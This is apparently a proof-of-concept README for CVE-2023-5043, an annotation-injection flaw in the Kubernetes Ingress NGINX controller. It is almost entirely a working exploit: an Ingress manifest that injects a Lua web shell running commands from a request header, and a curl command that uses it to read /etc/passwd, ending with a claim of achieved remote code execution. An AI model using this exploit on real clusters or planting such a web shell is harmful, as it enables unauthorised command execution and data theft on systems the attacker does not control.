# CVE-2023-5043
**Ingress nginx annotation injection causes arbitrary command execution**

1. Create Ingress (can be created without Service and Pod)
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: ingress-exploit
  annotations:
    kubernetes.io/ingress.class: "nginx"
    nginx.ingress.kubernetes.io/configuration-snippet: |
      more_set_headers "robinak"
            proxy_pass http://upstream_balancer;
                                proxy_redirect                          off;
        }
        location /robinak/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()["cmd"]);local rschar = rsfile:read("*all");ngx.say(rschar); } } location /fs/{
spec:
  rules:
  - host: robinak.me
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: exploit
            port:
              number: 80
```
2. Make request by specifying the public address of your Ingress NGINX controller:
```bash
curl -v -H 'Host: robinak.me' -H "cmd: cat /etc/passwd" http://IP/robinak/
```
3. Got RCE
![1cveed](https://github.com/r0binak/CVE-2023-5043/assets/80983900/218a28ca-5f7f-427e-87a4-c025ff97f496)
